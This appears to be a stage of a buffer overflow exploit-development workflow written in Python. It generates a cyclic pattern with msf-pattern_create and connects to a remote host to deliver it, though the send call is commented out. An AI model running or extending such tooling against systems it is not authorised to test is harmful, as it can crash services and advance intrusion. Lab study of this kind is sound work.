#!/usr/bin/env python3
# stage 3 generate pattern offset
import socket,sys,subprocess

RHOST = sys.argv[1]                                     # the remote host
RPORT = int(sys.argv[2])                                # the remote port
byte_length = sys.argv[3]                               # the byte length

# use msf-pattern_create to generate the pattern
pattern_file = open("pattern_file", "w")
subprocess.run(["msf-pattern_create", "-l", byte_length], stdout=pattern_file)

# handle connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# setup payload  
with open("pattern_file", "r") as f:
    pattern = f.read()

postfix = "\n"

print(len(postfix))
# set the encoding for Python3
buff = bytes(pattern + postfix, encoding="ascii")
print(len(buff))

# payload status
print("[+] - Sendng Payload - [ {} Bytes ]".format(len(buff) - len(postfix)))

#s.send(buff)
#s.close()
